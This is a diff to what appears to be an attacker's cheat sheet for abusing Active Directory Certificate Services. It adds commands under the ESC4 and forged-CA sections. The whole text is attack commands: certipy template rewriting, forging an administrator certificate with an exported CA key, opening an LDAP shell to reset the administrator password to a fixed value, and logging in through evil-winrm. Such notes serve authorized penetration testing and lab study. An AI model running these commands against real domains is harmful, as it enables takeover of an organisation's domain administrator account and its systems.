@@ -596,6 +596,9 @@ adminSid=$(certipy account -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -user 'a
 
 +---------- ESC4 ----------+
 certipy template -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -template '' -write-default-configuration
+certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
+change_password administrator 123qweasdF!
+evil-winrm -i '$TARGET' -u 'administrator' -p '123qweasdF!'
 
 +---------- ESC7 ----------+
 certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -add-officer '$USERNAME' -target $DC
@@ -615,6 +618,7 @@ certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
 certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
 certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator_forged.pfx'
 change_password administrator 123qweasdF!
+evil-winrm -i '$TARGET' -u 'administrator' -p '123qweasdF!'
 
 +---------- Authenticate ----------+
 certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
